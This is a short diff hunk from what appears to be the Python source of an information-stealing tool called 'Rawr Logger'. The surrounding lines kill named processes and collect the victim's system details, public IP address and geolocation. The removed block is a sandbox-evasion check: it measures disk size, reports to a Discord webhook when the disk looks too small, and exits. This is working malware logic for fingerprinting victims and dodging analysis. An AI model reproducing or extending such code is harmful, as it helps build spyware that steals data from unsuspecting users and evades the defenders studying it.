@@ -37,32 +37,6 @@ for proc in psutil.process_iter():
     if proc.name() in process:
         proc.kill()
 
-minDiskSizeGB = 50
-if len(sys.argv) > 1:
-    minDiskSizeGB = float(sys.argv[1])
-
-_, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
-diskSizeGB = diskSizeBytes / 1073741824
-
-if diskSizeGB < minDiskSizeGB:
-    try:
-        embedss = {
-            "avatar_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
-            "embeds": [
-                {
-                    "author": {
-                        "name": "Rawr Logger",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
-                    },
-                    "description": f"```Insufficient Disk Space Detected```",
-                }
-            ]
-        }
-        requests.post(webhook, json=embedss)
-        os._exit(1)
-    except Exception as e:
-        pass
-
 machines = platform.uname()
 ips = requests.get('https://api.ipify.org').text
 info = requests.get("http://ipinfo.io/json").json()
